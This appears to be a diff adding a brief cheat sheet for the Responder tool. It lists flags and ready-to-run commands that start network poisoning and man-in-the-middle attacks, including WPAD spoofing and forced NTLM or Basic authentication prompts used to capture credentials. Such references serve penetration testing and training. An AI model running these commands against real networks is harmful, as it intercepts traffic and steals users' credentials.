@@ -1,0 +1,16 @@
+# responder
+# Common flags:
+# -f    fingerprint hosts
+# -r    Enable answers for netbios wredir suffix queries. This may break stuff (Default: Off)
+# -w    Enable WPAD MiTM
+# -P    Force NTLM (transparently)/Basic (prompt) authentication for the proxy.
+# Any MiTM server can be turned off in Responder.conf
+
+# Start a MiTM attack with poisoning on all the services we see as "On"
+responder -I eth0
+
+# Typical suggested usage
+responder -I eth0 -rPv
+
+# Start a MiTM attack and enable WPAD server
+responder -I eth0  -wrf
